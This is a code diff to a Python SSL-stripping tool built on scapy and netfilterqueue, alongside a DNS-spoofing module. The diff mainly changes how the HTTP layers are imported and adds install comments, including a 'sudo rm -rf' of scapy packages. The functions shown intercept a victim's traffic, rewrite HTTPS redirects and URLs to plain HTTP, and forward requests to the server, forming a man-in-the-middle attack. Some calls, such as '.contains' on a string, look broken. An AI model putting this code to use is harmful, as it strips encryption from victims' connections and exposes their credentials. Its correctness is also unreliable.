@@ -1,6 +1,11 @@
 import netfilterqueue
 import scapy.all as scapy
 import dns_spoofing
+from scapy.layers.http import *
+#httprequest requires scapy 2.5 (which is supported by python 2.7)
+#sudo rm -rf /usr/local/lib/python2.7/dist-packages/scapy*
+#sudo -H pip install setuptools
+#sudo -H pip install scapy
 
 #https://venafi.com/blog/what-are-ssl-stripping-attacks/
 #Typical sequence of events without SSL stripping:
@@ -27,8 +32,8 @@ tls_sessions = {}
 
 #Check whether this is a redirect to https
 def https_switching_request(scapy_packet):
-    if scapy_packet.haslayer(scapy.HTTPResponse):
-        http_layer = scapy_packet.getlayer(scapy.HTTPResponse)#https://github.com/secdev/scapy/blob/master/scapy/layers/http.py#L540-L581
+    if scapy_packet.haslayer(HTTPResponse):
+        http_layer = scapy_packet.getlayer(HTTPResponse)#https://github.com/secdev/scapy/blob/master/scapy/layers/http.py#L540-L581
         
         https = http_layer.Location.contains('https://') 
         redirect = http_layer.Status_Code[0] == "3" #3xx status code is for redirection (wikipedia)
@@ -57,7 +62,7 @@ def to_server(scapy_packet):
 
 #Transforms an https redirect to normal http response
 def strip_https_redirect(scapy_packet):
-    http_layer = scapy_packet.getlayer(scapy.HTTPResponse)
+    http_layer = scapy_packet.getlayer(HTTPResponse)
     http_layer.Location = http_layer.Location.replace('https://', 'http://')
     http_layer.Status_Code = "200"
 
@@ -78,7 +83,7 @@ def forward_http_to_https(scapy_packet):
     victim_ip = scapy_packet.getlayer(scapy.IP).src
     server_ip = scapy_packet.getlayer(scapy.IP).dst
 
-    http_request = scapy_packet.getlayer(scapy.HTTPRequest)
+    http_request = scapy_packet.getlayer(HTTPRequest)
     
     http_request.Location = http_request.Location.replace('http://', 'https://')
 
@@ -90,7 +95,7 @@ def send_https_listen_and_forward(session, new_request, original_packet): #may n
     response_packet = session.sr1(new_request, timeout=2)
 
     #strip url from https
-    http_response =  response_packet.getlayer(scapy.HTTPResponse)
+    http_response =  response_packet.getlayer(HTTPResponse)
     http_response.Location = http_response.Location.replace('https://', 'http://')
     
     #build http response packet
